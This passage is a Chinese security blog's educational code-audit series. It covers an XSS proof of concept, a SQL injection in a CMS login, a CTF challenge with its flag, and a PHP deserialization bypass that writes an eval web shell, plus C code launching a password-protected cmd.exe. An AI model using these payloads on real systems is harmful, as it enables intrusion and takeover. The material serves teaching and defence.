class="meta-keyword">include</span><span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> welcome[<span class="number">1700</span>] = <span class="string">"                                      \n\</span></span><br><span class="line"><span class="string">                     _____    ___     ___    _                                      \n\</span></span><br><span class="line"><span class="string">                    |_   _|  / _ \\   / _ \\  | |  ___                                \n\</span></span><br><span class="line"><span class="string">                      | |   | | | | | | | | | | / __|                               \n\</span></span><br><span class="line"><span class="string">                      | |   | |_| | | |_| | | | \\__ \\                               \n\</span></span><br><span class="line"><span class="string">                      |_|    \\___/   \\___/  |_| |___/                               \n\</span></span><br><span class="line"><span class="string">                                                                \n\</span></span><br><span class="line"><span class="string">                                                                \n\</span></span><br><span class="line"><span class="string">                                                                \n\</span></span><br><span class="line"><span class="string">                      Please input your password!               \n\</span></span><br><span class="line"><span class="string">                           password : "</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>,welcome);</span><br><span class="line">        <span class="keyword">char</span> password[<span class="number">30</span>] = <span class="string">"0"</span>;</span><br><span class="line">        <span class="keyword">char</span> pwd[<span class="number">30</span>] = <span class="string">"t00ls66666"</span>;</span><br><span class="line">        <span class="keyword">int</span> ch,i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>((ch = getch())!=<span class="string">'\r'</span>)&#123;</span><br><span class="line">            password[i++] = ch;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,<span class="string">'*'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strncmp</span>(password,pwd,<span class="number">10</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            system(<span class="string">"cmd.exe"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s"</span>,<span class="string">"Error\n"</span>);</span><br><span class="line">            fflush(<span class="built_in">stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后贴一张效果图片（这里我使用本地虚拟机来演示）：</p>
<p><img src="/img/渗透测试/渗透测试之MSF窃取Windows用户令牌/3.gif" alt="3"></p>
<p>本文没啥技术亮点，不喜勿喷哈：)</p>
<h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><p><a href="https://pentestlab.blog/2017/04/03/token-manipulation/" target="_blank" rel="noopener">Token Manipulation</a> </p>
<p><a href="https://www.offensive-security.com/metasploit-unleashed/fun-incognito/" target="_blank" rel="noopener">Fun with Incognito</a> </p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/09/16/代码审计Day12 - 误用htmlentities函数引发的漏洞/">代码审计Day12 - 误用htmlentities函数引发的漏洞</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-16
        </span>
        
          <div class="post-category">
            
              <a href="/categories/代码审计/">代码审计</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <p>本文由红日安全成员： <strong>l1nk3r</strong> 编写，如有不当，还望斧正。</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大家好，我们是红日安全-代码审计小组。最近我们小组正在做一个PHP代码审计的项目，供大家学习交流，我们给这个项目起了一个名字叫 <a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener"><strong>PHP-Audit-Labs</strong></a> 。现在大家所看到的系列文章，属于项目 <strong>第一阶段</strong> 的内容，本阶段的内容题目均来自 <a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">PHP SECURITY CALENDAR 2017</a> 。对于每一道题目，我们均给出对应的分析，并结合实际CMS进行解说。在文章的最后，我们还会留一道CTF题目，供大家练习，希望大家喜欢。下面是 <strong>第12篇</strong> 代码审计文章：</p>
<h2 id="Day-12-String-Lights"><a href="#Day-12-String-Lights" class="headerlink" title="Day 12 - String Lights"></a>Day 12 - String Lights</h2><p>题目代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day12/1.png" alt="1"></p>
<p><strong>漏洞解析</strong> ：</p>
<p>根据题目意思，这里考察的应该是个 <strong>xss漏洞</strong> ， 漏洞触发点应该在代码中的 <strong>第13-14行</strong> 。这两行代码的作用是直接输出一个html的 <strong>\&lt;a></strong> 标签。代码中的 <strong>第3-5行</strong> ，<strong>foreach循环</strong> 对 <strong>$_GET</strong> 传入的参数进行了处理，但是这里有个问题。我们看下 <strong>第四行</strong> 的代码，这行代码针对 <strong>$value</strong> 进行类型转换，强制变成int类型。但是这部分代码只处理了 <strong>$value</strong> 变量，没针对 <strong>$key</strong> 变量进行处理。经过了 <strong>第3-5行</strong> 的代码处理之后，根据 <strong>&amp;</strong> 这个符号进行分割，然后拼接到 <strong>第13行</strong> 的 <strong>echo</strong> 语句中，在输出的时候又进行了一次 <strong>htmlentities</strong> 函数处理。 <strong>htmlentities</strong> 函数主要是会对一些特殊符号进行HTML实体编码。具体定义如下：</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.htmlentities.php" target="_blank" rel="noopener">htmlentities</a> — 将字符转换为 HTML 转义字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; string htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(<span class="string">"default_charset"</span>) [, bool $double_encode = <span class="keyword">true</span> ]]] )</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>作用：在写PHP代码时，不能在字符串中直接写实体字符，PHP提供了一个将HTML特殊字符转换成实体字符的函数 htmlentities()。</p>
</blockquote>
<p>注：<strong>htmlentities()</strong> 并不能转换所有的特殊字符，是转换除了空格之外的特殊字符，且单引号和双引号需要单独控制（通过第二个参数）。第2个参数取值有3种，分别如下：</p>
<ul>
<li>ENT_COMPAT（默认值）：只转换双引号。</li>
<li>ENT_QUOTES：两种引号都转换。</li>
<li>ENT_NOQUOTES：两种引号都不转换。</li>
</ul>
<p>这里附上一个 <a href="http://www.w3school.com.cn/html/html_entities.asp" target="_blank" rel="noopener">HTML 中有用的字符实体表</a> </p>
<p><img src="/img/PHP-Audit-Labs/Day12/3.png" alt="3"></p>
<p>经过上面的分析，我们再回到题目，想想如何构造一下攻击 <strong>payload</strong> 。我们先梳理一些已知信息：</p>
<ul>
<li>这里的 <strong>$query</strong> 参数可控</li>
<li>且 <strong>htmlentities</strong> 函数在这里可逃逸单引号</li>
<li>xss的漏洞触发点在 <strong>\<a></a></strong> 标签。</li>
</ul>
<p>在 <strong>\<a></a></strong> 中，我们可以通过 <strong>javascript</strong> 事件来执行js代码，例如： <strong>onclick</strong> 这类事件，因此最后的poc构造如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a&apos;onclick%3dalert(1)%2f%2f=c</span><br></pre></td></tr></table></figure>
<p><img src="/img/PHP-Audit-Labs/Day12/4.png" alt="4"></p>
<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p>本次实例分析选择 <a href="http://sqdownb.onlinedown.net/down/1510917608_44072_ym.rar" target="_blank" rel="noopener">DM企业建站系统 v201710</a> 中的 <strong>sql注入漏洞</strong> 来进行分析。首先，我们可以从cnvd上面看到一些相关信息，如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day12/5.png" alt="5"></p>
<p>从漏洞通告中可以发现一些有用的信息，漏洞位置在登陆处，搭建的时候提示后台登陆口位置在 <strong>admindm-yourname/g.php</strong> 文件中，打开这个文件，发现重定向到 <strong>admindm-yournamemod_common/login.php</strong> 文件中，所以漏洞触发点应该就在这个文件中。</p>
<p><img src="/img/PHP-Audit-Labs/Day12/6.png" alt="6"></p>
<p>打开 <strong>admindm-yournamemod_common/login.php</strong> 这个文件，一眼就看到漏洞位置，截取部分相关代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day12/7.png" alt="7"></p>
<p> <strong>第15行</strong> 很明显存在sql注入漏洞，通过拼接的方式直接插入到select语句中。 <strong>第15行</strong> 中的 <strong>$user</strong> 变量是通过 <strong>POST</strong> 方式提交上来，其值可控。但是上图的 <strong>第3行</strong> 代码调用 <strong>htmlentitiesdm</strong> 函数，对 <strong>POST</strong> 数据进行了处理，我们跟进这个 <strong>htmlentitiesdm</strong> 函数。该函数位置在 <strong>component/dm-config/global.common.php</strong> 文件中，截取关键代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day12/8.png" alt="8"></p>
<p>这个函数是调用 <strong>htmlentities</strong> 函数针对输入的数据进行处理。前面我们已经介绍过了这个函数的用法，这里这个函数的可选参数是 <strong>ENT_NOQUOTES</strong> ，也就是说两种引号都不转换。下面我们来看个小例子：</p>
<p><img src="/img/PHP-Audit-Labs/Day12/9.png" alt="9"></p>
<p>这里我猜测开发者应该是考虑到了xss的问题，但是由于 <strong>htmlentities</strong> 这个函数选择的参数出现了偏差，导致这里我们可以引入单引号造成注入的问题。</p>
<p>我们看看最新版是怎么修复，使用 <strong>beyond compare</strong> 对比两个版本代码的差别。</p>
<p><img src="/img/PHP-Audit-Labs/Day12/10.png" alt="10"></p>
<p>新版修复的时候将可选参数修改为 <strong>ENT_QUOTES</strong> ，这个参数的作用就是过滤单引号加双引号，我们来看看下面这个例子，就很容易明白了这个参数的作用了。</p>
<p><img src="/img/PHP-Audit-Labs/Day12/11.png" alt="11"></p>
<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>这里因为没有回显，所以是盲注，下面是验证截图：</p>
<p><img src="/img/PHP-Audit-Labs/Day12/12.png" alt="12"></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>针对 <strong>htmlentities</strong> 这个函数，我们建议大家在使用的时候，尽量加上可选参数，并且选择 <strong>ENT_QUOTES</strong> 参数。</p>
<p><img src="/img/PHP-Audit-Labs/Day12/13.png" alt="13"></p>
<p>我们看看对比的效果</p>
<p><img src="/img/PHP-Audit-Labs/Day12/14.png" alt="14"></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>看完了上述分析，不知道大家是否对 <strong>htmlentities</strong> 函数在使用过程中可能产生的问题，有了更加深入的理解，文中用到的代码可以从 <a href="http://sqdownb.onlinedown.net/down/1510917608_44072_ym.rar" target="_blank" rel="noopener">这里</a> 下载，当然文中若有不当之处，还望各位斧正。如果你对我们的项目感兴趣，欢迎发送邮件到 <a href="mailto:**hongrisec@gmail.com" target="_blank" rel="noopener">**hongrisec@gmail.com</a><strong> 联系我们。</strong>Day12** 的分析文章就到这里，我们最后留了一道CTF题目给大家练手，题目如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $str=stripslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM ctf.users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo $query;</span></span><br><span class="line"></span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">while</span>($row = mysql_fetch_array($result))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . $row[<span class="string">'name'</span>] . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># Host: localhost  (Version: 5.5.53)</span><br><span class="line"># Date: 2018-08-05 12:55:29</span><br><span class="line"># Generator: MySQL-Front 5.3  (Build 4.234)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!40101 SET NAMES utf8 */</span>;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Structure for table "users"</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`users`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`users`</span> (</span><br><span class="line">  <span class="string">`Id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`pass`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`flag`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`Id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=MyISAM AUTO_INCREMENT=<span class="number">2</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Data for table "users"</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `users` DISABLE KEYS */</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`users`</span> <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="string">'admin'</span>,<span class="string">'qwer!@#zxca'</span>,<span class="string">'hrctf&#123;sql_Inject1on_Is_1nterEst1ng&#125;'</span>);</span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `users` ENABLE KEYS */</span>;</span><br></pre></td></tr></table></figure>
<p>题解我们会阶段性放出，如果大家有什么好的解法，可以在文章底下留言，祝大家玩的愉快！</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://github.com/CHYbeta/Code-Audit-Challenges/blob/master/php/challenge-50.md" target="_blank" rel="noopener">Code-Audit-Challenges</a></p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/09/12/代码审计Day11 - unserialize反序列化漏洞/">代码审计Day11 - unserialize反序列化漏洞</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-12
        </span>
        
          <div class="post-category">
            
              <a href="/categories/代码审计/">代码审计</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <p>本文由红日安全成员： <strong>licong</strong> 编写，如有不当，还望斧正。</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大家好，我们是红日安全-代码审计小组。最近我们小组正在做一个PHP代码审计的项目，供大家学习交流，我们给这个项目起了一个名字叫 <a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener"><strong>PHP-Audit-Labs</strong></a> 。现在大家所看到的系列文章，属于项目 <strong>第一阶段</strong> 的内容，本阶段的内容题目均来自 <a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">PHP SECURITY CALENDAR 2017</a> 。对于每一道题目，我们均给出对应的分析，并结合实际CMS进行解说。在文章的最后，我们还会留一道CTF题目，供大家练习，希望大家喜欢。下面是 <strong>第11篇</strong> 代码审计文章：</p>
<h2 id="Day-11-Pumpkin-Pie"><a href="#Day-11-Pumpkin-Pie" class="headerlink" title="Day 11 - Pumpkin Pie"></a>Day 11 - Pumpkin Pie</h2><p>题目如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/1.png" alt=""></p>
<p><strong>漏洞解析：</strong> (上图代码第11行正则表达式应改为：’/O:\d:/‘)</p>
<p>题目考察对php反序列化函数的利用。在第10行 <strong>loadData()</strong> 函数中，我们发现了 <strong>unserialize</strong> 函数对传入的 <strong>$data</strong> 变量进行了反序列。在反序列化前，对变量内容进行了判断，先不考虑绕过，跟踪一下变量，看看变量是否可控。在代码 <strong>第6行</strong> ，调用了 <strong>loadData()</strong> 函数，<code>$data</code>变量来自于 <strong>__construct()</strong> 构造函数传入的变量。代码第32行，对 <strong>Template</strong> 类进行了实例化，并将 <strong>cookie</strong> 中键为’data’数据作为初始化数据进行传入，<code>$data</code>数据我们可控。开始考虑绕过对传入数据的判断。</p>
<p>代码 <strong>11行</strong> ，第一个if，截取前两个字符，判断反序列化内容是否为对象，如果为对象，返回为空。php可反序列化类型有String,Integer,Boolean,Null,Array,Object。去除掉Object后，考虑采用数组中存储对象进行绕过。</p>
<p>第二个if判断,匹配 字符串为 \’O:任意十进制:’,将对象放入数组进行反序列化后，仍然能够匹配到，返回为空，考虑一下如何绕过正则匹配，PHP反序列化处理部分源码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/2.png" alt="2"></p>
<p><img src="/img/PHP-Audit-Labs/Day11/3.png" alt="3"></p>
<p><img src="/img/PHP-Audit-Labs/Day11/4.png" alt="4"></p>
<p>在PHP源码var_unserializer.c，对反序列化字符串进行处理，在代码568行对字符进行判断，并调用相应的函数进行处理，当字符为’O’时，调用 <strong>yy13</strong> 函数，在 <strong>yy13</strong> 函数中，对‘O‘字符的下一个字符进行判断，如果是’:’,则调用 <strong>yy17</strong> 函数,如果不是则调用 <strong>yy3</strong> 函数,直接return 0，结束反序列化。接着看 <strong>yy17</strong> 函数。通过观察yybm[]数组可知，第一个if判断是否为数字，如果为数字则跳转到 <strong>yy20</strong> 函数，第二个判断如果是’+’号则跳转到 <strong>yy19</strong> ，在 <strong>yy19</strong> 中，继续对 <strong>+号</strong> 后面的字符进行判断，如果为数字则跳转到 <strong>yy20</strong> ,如果不是则跳转到 <strong>yy18</strong> ， <strong>y18</strong> 最终跳转到 <strong>yy3</strong> ，退出反序列化流程。由此，在’O:’,后面可以增加’+’，用来绕过正则判断。</p>
<p>绕过了过滤以后，接下来考虑怎样对反序列化进行利用，反序列化本质是将序列化的字符串还原成对应的类实例，在该过程中，我们可控的是序列化字符串的内容，也就是对应类中变量的值。我们无法直接调用类中的函数，但PHP在满足一定的条件下，会自动触发一些函数的调用，该类函数，我们称为魔术方法。通过可控的类变量，触发自动调用的魔术方法，以及魔术方法中存在的可利用点，进而形成反序列化漏洞的利用。</p>
<p>在代码31行，对象销毁时会调用 <strong>createCache()</strong> 函数，函数将 <code>$template</code> 中的内容放到了 <code>$cacheFile</code> 对应的文件中。 <strong>file_put_contents()</strong> 函数，当文件不存在时，会创建该文件。由此可构造一句话，写入当前路径。</p>
<p> <code>$cacheFile</code> 和 <code>$template</code> 为类变量，反序列化可控，由此，构造以下反序列化内容，别忘了加’+’号</p>
<p><img src="/img/PHP-Audit-Labs/Day11/5.png" alt="5"></p>
<p>放入cookie需进行URL编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;O:+<span class="number">8</span>:<span class="string">"Template"</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">"cacheFile"</span>;s:<span class="number">10</span>:<span class="string">"./test.php"</span>;s:<span class="number">8</span>:<span class="string">"template"</span>;s:<span class="number">25</span>:<span class="string">"&lt;?php eval($_POST[xx]);?&gt;"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>文件成功写入：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/6.png" alt="6"></p>
<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p>本次实例分析，选取的是 <strong>Typecho-1.1</strong> 版本，在该版本中，用户可通过反序列化Cookie数据进行前台Getshell。该漏洞出现于 <strong>install.php</strong> 文件 <strong>230行</strong> ，具体代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/7.png" alt="7"></p>
<p>在上图代码 <strong>第3行</strong> ，对Cookie中的数据base64解码以后，进行了反序列化操作，该值可控，接下来看一下代码触发条件。文件几个关键判断如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/8.png" alt="8"></p>
<p>第一个if判断，可通过GET传递 <strong>finish=任意值</strong> 绕过 ，第二if判断是否有GET或者POST传参，并判断Referer是否为空，第四个if判断Referer是否为本站点。紧接着还有判断，如下图：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/9.png" alt="9"></p>
<p>第一个if判断 <strong>$_GET[‘finish’]</strong> 是否设置，然后判断 <strong>config.inc.php文件</strong> 是否存在，安装后已存在，第三个判断cookie中 <strong>__typecho_config</strong> 参数是否为空，不为空。进入else分支。综上，具体构造如下图：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/10.png" alt="10"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</span><br><span class="line">Typecho_Cookie::delete(<span class="string">'__typecho_config'</span>);</span><br><span class="line">$db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</span><br></pre></td></tr></table></figure>
<p>反序列化结果存储到 <strong>$config</strong> 变量中，然后将 <strong>$config[‘adapter’]</strong> 和 <strong>$config[‘prefix’]</strong> 作为 <strong>Typecho_Db</strong> 类的初始化变量创建类实例。我们可以在 <strong>var/Typecho/Db.php</strong> 文件中找到该类构造函数代码，具体如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/11.png" alt="11"></p>
<p>上图代码 <strong>第6行</strong> ，对传入的 <strong>$adapterName</strong> 变量进行了字符串拼接操作，对于PHP而言，如果 <strong>$adapterName</strong> 类型为对象，则会调用该类 <strong>__toString()</strong> 魔术方法。可作为反序列化的一个触发点，我们全局搜索一下 <strong>__toString()</strong> ，查看是否有可利用的点。实际搜索时，会发现有三个类都定义了 <strong>__toString()</strong> 方法：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/19.png" alt="19"></p>
<ul>
<li><p>第一处 <strong>var\Typecho\Config.php</strong>：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/12.png" alt="12"></p>
<p>调用 <strong>serialize()</strong> 函数进行序列化操作，会自动触发 <strong>__sleep()</strong> ，如果存在可利用的 <strong>__sleep()</strong> ，则可以进一步利用。</p>
</li>
<li><p>第二处 <strong>var\Typecho\Db\Query.php</strong>：<br><img src="/img/PHP-Audit-Labs/Day11/13.png" alt="13"></p>
<p>该方法用于构建SQL语句，并没有执行数据库操作，所以暂无利用价值。</p>
</li>
<li><p>第三处<strong>var\Typecho\Feed.php</strong>：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/14.png" alt="14"></p>
<p>在代码 <strong>19行</strong> ， <strong>$this-&gt;_items</strong> 为类变量，反序列化可控，在代码 <strong>27行</strong> ， <strong>$item[‘author’]-&gt;screenName</strong> ，如果 <strong>$item[‘author’]</strong> 中存储的类没有’screenName’属性或该属性为私有属性，此时会触发该类中的 <strong>__get()</strong> 魔法方法，这个可作为进一步利用的点，继续往下看代码，未发现有危险函数的调用。</p>
</li>
</ul>
<p>记一波魔术方法及对应的触发条件，具体如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() <span class="comment">//使用unserialize时触发</span></span><br><span class="line">__sleep() <span class="comment">//使用serialize时触发</span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>
<p>在 <strong>var/Typecho/Request.php</strong> 的  <strong>Typecho_Request</strong> 类中，我们发现 <strong>__get()</strong> 方法，跟踪该方法的调用，具体如下图：<img src="/img/PHP-Audit-Labs/Day11/15.png" alt="15"></p>
<p> <strong>array_map()</strong> 函数和 <strong>call_user_func</strong> 函数，都可以作为利用点，<strong>$filter</strong> 作为调用函数，<strong>$value</strong> 为函数参数，跟踪变量,看一下是否可控。这两个变量都来源于类变量，反序列化可控。从上面的分析中，可知当 <strong>$item[‘author’]</strong> 满足一定条件会触发 <strong>__get</strong> 方法。</p>
<p>假设 <strong>$item[‘author’]</strong> 中存储 <strong>Typecho_Request</strong> 类实例，此时调用 <strong>$item[‘author’]-&gt;screenName</strong> ，在<strong>Typecho_Request</strong> 类中没有该属性，就会调用类中的 <strong>__get($key)</strong> 方法，<strong>$key</strong> 传入的值为 <strong>scrrenName</strong> 。参数传递过程如下：<code>$key=&#39;scrrenName&#39;</code>=&gt;<code>$this-&gt;_param[$key]</code>=&gt;<code>$value</code></p>
